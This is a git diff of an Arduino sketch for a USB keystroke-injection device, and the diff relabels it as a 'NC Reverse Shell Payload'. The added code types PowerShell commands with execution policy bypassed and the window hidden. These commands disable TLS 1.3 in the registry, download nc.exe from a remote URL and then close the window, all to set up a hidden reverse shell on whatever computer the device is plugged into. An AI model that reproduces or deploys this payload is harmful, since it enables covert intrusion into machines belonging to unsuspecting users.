@@ -1,5 +1,5 @@
 /*
-  Single File Encryption Payload for GENERIC USB ATMEGA32U4 hw
+  NC Reverse Shell Payload for GENERIC USB ATMEGA32U4 hw
   Copyright (c) 2021, Paulo C. Marcon (Licensed under MIT)
   For more information see: https://github.com/pcmarcon/malduino-payload-sample
 */
@@ -174,7 +174,7 @@ void setup() {
     typeKey(KEY_RETURN);
 
     delay(defaultDelay);
-    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile {New-Item 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Server' -Force}");
+    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {New-Item 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Server' -Force}");
 
     delay(defaultDelay);
     delay(100);
@@ -183,7 +183,7 @@ void setup() {
     typeKey(KEY_RETURN);
 
     delay(defaultDelay);
-    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile {New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Server' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force}");
+    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Server' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force}");
 
     delay(defaultDelay);
     delay(100);
@@ -192,7 +192,7 @@ void setup() {
     typeKey(KEY_RETURN);
 
     delay(defaultDelay);
-    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile {New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Server' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force}");
+    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Server' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force}");
 
     delay(defaultDelay);
     delay(100);
@@ -201,7 +201,7 @@ void setup() {
     typeKey(KEY_RETURN);
 
     delay(defaultDelay);
-    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile {New-Item 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Client' -Force}");
+    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {New-Item 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Client' -Force}");
 
     delay(defaultDelay);
     delay(100);
@@ -210,7 +210,7 @@ void setup() {
     typeKey(KEY_RETURN);
 
     delay(defaultDelay);
-    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile {New-ItemProperty -path 'HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\SCHANNEL\\\\Protocols\\\\TLS 1.3\\\\Client' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force}");
+    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {reg add HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319 /v SystemDefaultTlsVersions /t REG_DWORD /d 1 /f /reg:64}");
 
     delay(defaultDelay);
     delay(100);
@@ -219,25 +219,7 @@ void setup() {
     typeKey(KEY_RETURN);
 
     delay(defaultDelay);
-    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile {New-ItemProperty -path 'HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\SCHANNEL\\\\Protocols\\\\TLS 1.3\\\\Client' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force}");
-
-    delay(defaultDelay);
-    delay(100);
-
-    delay(defaultDelay);
-    typeKey(KEY_RETURN);
-
-    delay(defaultDelay);
-    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile {reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\.NETFramework\\\\v4.0.30319 /v SystemDefaultTlsVersions /t REG_DWORD /d 1 /f /reg:64}");
-
-    delay(defaultDelay);
-    delay(100);
-
-    delay(defaultDelay);
-    typeKey(KEY_RETURN);
-
-    delay(defaultDelay);
-    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile \"(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/bin/nc.bin', 'nc.exe')\"");
+    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/bin/nc.bin', 'nc.exe')\"");
 
     delay(defaultDelay);
     delay(100);
@@ -265,7 +247,16 @@ void setup() {
 
     delay(defaultDelay);
     typeKey(KEY_RETURN);
-    
+
+    delay(defaultDelay);
+    Keyboard.print("exit");
+
+    delay(defaultDelay);
+    delay(100);
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+   
   /* ----- End-Payload -----*/
   
   Keyboard.end();
